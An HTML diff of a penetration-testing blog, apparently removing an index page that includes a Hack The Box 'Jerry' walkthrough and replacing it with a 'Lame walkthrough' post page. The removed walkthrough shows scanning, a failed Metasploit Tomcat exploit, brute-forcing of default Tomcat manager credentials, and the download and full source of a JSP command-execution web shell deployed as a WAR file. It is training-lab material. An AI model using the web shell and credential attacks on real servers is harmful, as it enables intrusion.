@@ -4,14 +4,21 @@
   <meta charset="utf-8">
   
   
-  <title>Pentest A-Z</title>
+  <title>Lame walkthrough | Pentest A-Z</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Pentest A-Z">
-<meta property="og:url" content="https://vpecsi.github.io/index.html">
+  <meta name="description" content="Lame |IP: 10.10.10.3 |OS: Linux Information GatheringnmapInitial scan 12345678sudo nmap 10.10.10.3 -p- -T4 -oA lame_quickPORT     STATE SERVICE21&#x2F;tcp   open  ftp22&#x2F;tcp   open  ssh139&#x2F;tcp  open  netbio">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lame walkthrough">
+<meta property="og:url" content="https://vpecsi.github.io/2023/04/07/Lame-walkthrough/index.html">
 <meta property="og:site_name" content="Pentest A-Z">
+<meta property="og:description" content="Lame |IP: 10.10.10.3 |OS: Linux Information GatheringnmapInitial scan 12345678sudo nmap 10.10.10.3 -p- -T4 -oA lame_quickPORT     STATE SERVICE21&#x2F;tcp   open  ftp22&#x2F;tcp   open  ssh139&#x2F;tcp  open  netbio">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-04-07T17:59:30.000Z">
+<meta property="article:modified_time" content="2023-04-07T19:17:53.982Z">
 <meta property="article:author" content="Valentin Pecsi">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="walkthrough">
+<meta property="article:tag" content="pentest">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternate" href="/atom.xml" title="Pentest A-Z" type="application/atom+xml">
@@ -73,189 +80,7 @@
 </header>
 
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/04/10/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2023-04-10T18:15:35.624Z" itemprop="datePublished">2023-04-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/04/10/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://vpecsi.github.io/2023/04/10/hello-world/" data-id="clgb60cth0002bdor5p20b8qe" data-title="Hello World" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Jerry-walkthrough" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/04/10/Jerry-walkthrough/" class="article-date">
-  <time class="dt-published" datetime="2023-04-10T11:20:19.000Z" itemprop="datePublished">2023-04-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/04/10/Jerry-walkthrough/">Jerry walkthrough</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><a target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/Jerry/statistics">Jerry</a> |<br>IP: 10.10.10.95 |<br>OS: Windows</p>
-<h2 id="Information-gathering"><a href="#Information-gathering" class="headerlink" title="Information gathering"></a>Information gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap 10.10.10.95 -p- -A -oA jerry_agressive_full_tcp</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">|_http-title: Apache Tomcat/7.0.88</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-server-header: Apache-Coyote/1.1</span><br><span class="line">(...)</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2012 (91%)</span><br></pre></td></tr></table></figure>
-
-<p>One open http port, likely Windows host. Not sure what “apache-coyote” is, to be checked.</p>
-<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># whatweb 10.10.10.95:8080        </span></span><br><span class="line">http://10.10.10.95:8080 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache-Coyote/1.1], IP[10.10.10.95], Title[Apache Tomcat/7.0.88]</span><br></pre></td></tr></table></figure>
-
-<p>Not much more learned except for the ‘html5’, this should have some kind of a front end. Let’s check with a browser.</p>
-<p><img src="/2023/04/10/Jerry-walkthrough/jerry_tomcat_home.png" alt="tomcat"></p>
-<p>Default Apache Tompcat page. Has admin login and active sub pages. May be interesting howerver let’s try a few basic things, then if there is not exploit for the server, we can dive deep.</p>
-<p>A lot of information is accessible<br>Username and password example in the admin logon error page:</p>
-<blockquote>
-<p>user tomcat with a password of s3cret</p>
-</blockquote>
-<p>tried admin &#x2F; admin and tomcat &#x2F; s3cret but didn’t work. Could brute force this if nothing else works.</p>
-<p><a target="_blank" rel="noopener" href="http://10.10.10.95:8080/manager/status">http://10.10.10.95:8080/manager/status</a> page</p>
-<ul>
-<li>jvm version: 1.8.0_171-b11</li>
-<li>jvm vendor: oracle</li>
-<li>os: Windows Server 2012 R2 6.3</li>
-<li>architecture: amd64</li>
-<li>hostname: JERRY</li>
-<li>Physical memory: 4095.48 MB Available memory: 3432.11 MB Total page file: 4799.48 MB Free page file: 4114.44 MB Memory load: 16 Process kernel time: 1.062 s Process user time: 10.343 s</li>
-</ul>
-<p>nothing in frontpage source code</p>
-<h3 id="wappalyzer"><a href="#wappalyzer" class="headerlink" title="wappalyzer"></a>wappalyzer</h3><p>nothing found regarding the website technology, but this is a standard hello world page of tomcat so I can find it out later.</p>
-<h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">95</span>:<span class="number">8080</span> -w /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">/<span class="built_in">aux</span>                  (Status: <span class="number">200</span>) [Size: <span class="number">0</span>]</span><br><span class="line">/<span class="built_in">com1</span>                 (Status: <span class="number">200</span>) [Size: <span class="number">0</span>]</span><br><span class="line">/<span class="built_in">com2</span>                 (Status: <span class="number">200</span>) [Size: <span class="number">0</span>]</span><br><span class="line">/<span class="built_in">com3</span>                 (Status: <span class="number">200</span>) [Size: <span class="number">0</span>]</span><br><span class="line">/<span class="built_in">con</span>                  (Status: <span class="number">200</span>) [Size: <span class="number">0</span>]</span><br><span class="line">/docs                 (Status: <span class="number">302</span>) [Size: <span class="number">0</span>] [--&gt; /docs/]</span><br><span class="line">/examples             (Status: <span class="number">302</span>) [Size: <span class="number">0</span>] [--&gt; /examples/]</span><br><span class="line">/favicon.ico          (Status: <span class="number">200</span>) [Size: <span class="number">21630</span>]</span><br><span class="line">/host-manager         (Status: <span class="number">302</span>) [Size: <span class="number">0</span>] [--&gt; /host-manager/]</span><br><span class="line">/<span class="built_in">lpt2</span>                 (Status: <span class="number">200</span>) [Size: <span class="number">0</span>]</span><br><span class="line">/<span class="built_in">lpt1</span>                 (Status: <span class="number">200</span>) [Size: <span class="number">0</span>]</span><br><span class="line">/manager              (Status: <span class="number">302</span>) [Size: <span class="number">0</span>] [--&gt; /manager/]</span><br></pre></td></tr></table></figure>
-
-<p>It’s worth running a larger wordlist on this if I follow this trail.</p>
-<h2 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h2><h3 id="Apache-Tomcat-7-0-88-jsp-upload-bypass-vulnerability-no-luck"><a href="#Apache-Tomcat-7-0-88-jsp-upload-bypass-vulnerability-no-luck" class="headerlink" title="Apache Tomcat 7.0.88 - jsp upload bypass vulnerability - no luck"></a>Apache Tomcat 7.0.88 - jsp upload bypass vulnerability - no luck</h3><p>Previous nmap scan result for tomcat:</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8080</span>/tcp open  http    Apache Tomcat/Coyote JSP engine <span class="number">1</span>.<span class="number">1</span></span><br><span class="line">|_http-<span class="built_in">title</span>: Apache Tomcat/<span class="number">7</span>.<span class="number">0</span>.<span class="number">88</span></span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-server-header: Apache-Coyote/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Coyote seems to be the webserver part of apache tomcat. [wikipedia: coyote](https://en.wikipedia.org/wiki/Apache_Tomcat#Coyote)</span><br></pre></td></tr></table></figure>
-<p>Searching for exploits</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/usr/share/exploitdb]</span><br><span class="line">└─<span class="comment"># searchsploit coyote    </span></span><br><span class="line">Exploits: No Results</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
-<p>found <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12617">one</a><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/42966">jsp upload bypass</a><br>Also available on metasploit:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search <span class="built_in">type</span>:exploit cve:2017 tomcat</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                         Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                         ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/http/tomcat_jsp_upload_bypass  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass</span><br></pre></td></tr></table></figure>
-
-<p>Let’s exploit this:</p>
-<p>set RHOSTS and LHOST to the correct values then</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/http/tomcat_jsp_upload_bypass) &gt; check</span><br><span class="line">[*] 10.10.10.95:8080 - The target is not exploitable.</span><br></pre></td></tr></table></figure>
-
-<p>oh well.. let’s try it anyways</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/http/tomcat_jsp_upload_bypass) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.14:4444 </span><br><span class="line">[*] Uploading payload...</span><br><span class="line">[-] Exploit aborted due to failure: unexpected-reply: Failed to upload the payload</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>
-
-<p>This is unfortunate, it seems the exploit isn’t going to work.</p>
-<h3 id="Apache-Tomcat-password-brute-forcing-worked"><a href="#Apache-Tomcat-password-brute-forcing-worked" class="headerlink" title="Apache Tomcat password brute forcing - worked"></a>Apache Tomcat password brute forcing - worked</h3><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat">hacktricks tomcat</a></p>
-<ol>
-<li>default password ideas</li>
-</ol>
-<ul>
-<li>admin:admin</li>
-<li>tomcat:tomcat</li>
-<li>admin:<NOTHING></li>
-<li>admin:s3cret</li>
-<li>admin:s3cr3t</li>
-<li>tomcat:s3cret</li>
-<li>tomcat:s3cr3t</li>
-<li>admin:tomcat</li>
-<li>tomcat:admin</li>
-</ul>
-<p>msf has a nice tool for trying tomcat passwords, so let’s try it</p>
-<p><code>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt;</code> </p>
-<p>Incredibely enough this tool comes with a tomcat specific username and password wordlist.. Let’s try with the default configuration after setting RHOSTS as usual</p>
-<p>And what do you know.. tomcat:s3cret worked, despite I wasn’t successful with it before. Probably because this time it tried the &#x2F;manager&#x2F;html uri instead of the &#x2F;host-manager&#x2F;html</p>
-<p><code>[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret</code></p>
-<p>Let’s try to log in! As I can’t seem to be able to get the login dialog again, I’m trying a handmade URL <code>10.10.10.95:8080/manager/html?username=&#39;tomcat&#39;&amp;password=&#39;s3cret&#39;</code>. Nope.. Let’s try with a clean chromium browser (used firefox with a lot of extensions until now) and the base url <code>10.10.10.95:8080/manager/html</code></p>
-<p>Success! <img src="/2023/04/10/Jerry-walkthrough/jerry_tomcat_manager.png"></p>
-<p>Note for my future self that it’s best to use a clean chromium browser instead of my usual hardened firefox for this purpose… One reason is that it’s the most common browser family (same engine as chrome, edge, brave and the rest) but also blocking&#x2F;privacy plugins can interfere with the website.</p>
-<p>So here we have this page, and we have a ‘deploy directory or war file’ option, and even an upload button. We could try to upload a script, call it and get shell access this way, but I need to search how to make a war file.</p>
-<p>The hacktricks tomcat page actually has tons of options, let’s go with the manual 2 option:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp</span><br><span class="line">zip -r backup.war cmd.jsp </span><br><span class="line"><span class="comment"># When this file is uploaded to the manager GUI, the /backup application will be added to the table.</span></span><br><span class="line"><span class="comment"># Go to: http://tomcat-site.local:8180/backup/cmd.jsp</span></span><br></pre></td></tr></table></figure>
-
-<p>So war files are just zip files with a .jsp file in them. And .jsp files seem to be similar to html with embedded java code. The manual 2 option in hacktricks has the below code which is simple enough, I don’t see any risky or damaging things in it, let’s give it a try.</p>
-<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// JSP_KIT</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// cmd.jsp = Command Execution (unix)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// by: Unknown</span></span><br><span class="line"><span class="comment">// modified: 27/06/2003</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">%&gt;</span><br><span class="line">&lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line">&lt;FORM METHOD=<span class="string">&quot;GET&quot;</span> NAME=<span class="string">&quot;myform&quot;</span> ACTION=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">&quot;text&quot;</span> NAME=<span class="string">&quot;cmd&quot;</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">&quot;submit&quot;</span> VALUE=<span class="string">&quot;Send&quot;</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;Command: &quot;</span> + request.getParameter(<span class="string">&quot;cmd&quot;</span>) + <span class="string">&quot;&lt;BR&gt;&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> p.getOutputStream();</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(in);</span><br><span class="line">        <span class="type">String</span> <span class="variable">disr</span> <span class="operator">=</span> dis.readLine();</span><br><span class="line">        <span class="keyword">while</span> ( disr != <span class="literal">null</span> ) &#123;</span><br><span class="line">                out.println(disr); </span><br><span class="line">                disr = dis.readLine(); </span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Upload succeeded, and now we have an additional &#x2F;backup line in the applications list:<br><img src="/2023/04/10/Jerry-walkthrough/jerry_tomcat_manager_backup.png"></p>
-<p><code>http://10.10.10.95:8080/backup/cmd.jsp</code><br>and we find ourselves at a nice little gui, i enter ‘ls’ click ‘send’<br>and .. error 500</p>
-<p>HTTP Status 500 - An exception occurred processing JSP page &#x2F;cmd.jsp at line 21</p>
-<p>So this is line 21: <code>Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</code><br>And the error is: <code>java.io.IOException: Cannot run program &quot;ls&quot;: CreateProcess error=2, The system cannot find the file specified</code></p>
-<p>But then ‘whoami’ works ‘nt authority\system’ and I remember that this is a windows host which could be an issue.</p>
-<p>.. ‘dir’ also doesn’t work, but when I type ‘help’ it does list all possible commands, and based on this, this indeed seems like a windows cmd.</p>
-<p>This is strange and it may be the issue that the script I used is also only working on linux hosts. And sure enough I realize that the script is actually called ‘Command Execution <strong>(unix)</strong>‘..</p>
-<p>.. but after a little bit of reading, sure enough java is platform independent, and cmd execution would work on windows exactly the same way. This may be related to the ouptut of commands (some characters or string size that we can’t handle that causes the exception), but before debugging this, it’s easier to try other solutions on hacktricks.</p>
-<p><a target="_blank" rel="noopener" href="http://vonloesch.de/filebrowser.html">jsp filebrowser</a><br>This is an complete jsp tool, not just a quick cmd grab script. A little bit overkill but it seems it has been developed for some time, has proper exception handling so it could help finding out what the issues is.</p>
-<p>Download, extract then:</p>
-<p><code>zip -r browser.war Browser.jsp</code></p>
-<p>Deploy through the management gui.</p>
-<p><code>http://10.10.10.95:8080/browser/Browser.jsp</code></p>
-<p>Works!<br><img src="/2023/04/10/Jerry-walkthrough/jerry_tomcat_manager_browser.png" alt="browser"></p>
-<p>And as seen from source, it has a command execution feature too, which works too!!<br><img src="/2023/04/10/Jerry-walkthrough/jerry_tomcat_manager_launch.png" alt="Launch external program"></p>
-<p>..aand we have the flag, in fact surprisingly we have both flags!</p>
-<p><code>type c:\Users\Administrator\Desktop\flags\&quot;2 for the price of 1.txt&quot;</code></p>
-<p>What a ride! :)</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://vpecsi.github.io/2023/04/10/Jerry-walkthrough/" data-id="clgb60ctc0000bdora39dbaoq" data-title="Jerry walkthrough" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Lame-walkthrough" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-Lame-walkthrough" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/04/07/Lame-walkthrough/" class="article-date">
   <time class="dt-published" datetime="2023-04-07T17:59:30.000Z" itemprop="datePublished">2023-04-07</time>
@@ -268,8 +93,8 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/04/07/Lame-walkthrough/">Lame walkthrough</a>
+    <h1 class="p-name article-title" itemprop="headline name">
+      Lame walkthrough
     </h1>
   
 
@@ -362,11 +187,23 @@
     </footer>
   </div>
   
-</article>
-
-
+    
+<nav id="article-nav">
+  
+    <a href="/2023/04/10/Jerry-walkthrough/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Jerry walkthrough
+        
+      </div>
+    </a>
+  
+  
+</nav>
 
   
+</article>
 
 
 </section>
